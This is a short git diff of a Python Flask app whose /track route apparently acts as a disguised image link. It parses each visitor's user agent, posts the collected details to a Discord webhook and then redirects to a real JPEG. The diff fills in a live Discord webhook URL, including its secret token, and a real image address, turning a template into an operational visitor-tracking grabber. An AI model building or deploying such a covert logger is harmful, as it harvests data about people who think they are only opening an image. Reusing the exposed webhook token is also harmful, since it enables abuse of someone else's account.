@@ -5,7 +5,7 @@ from user_agents import parse
 # Initialize Flask app
 app = Flask(__name__)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/XXX/YYY"  # Your webhook URL here
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1360532705644773546/lc5c8r8P_MC-MJRytn7ea7ZaANatkhXlf15_sRYT6Ist5oV5eEM-KtRLUKWYZe0RrgKX"  # Your webhook URL here
 
 @app.route('/track')
 def track():
@@ -40,7 +40,7 @@ def track():
     requests.post(WEBHOOK_URL, json={"content": content})
 
     # Redirect to your image link
-    return redirect("https://your-image-link.com")
+    return redirect("https://www.smartage.pl/wp-content/uploads/2023/04/67-1.jpg")
 
 if __name__ == "__main__":
     app.run(port=5000)
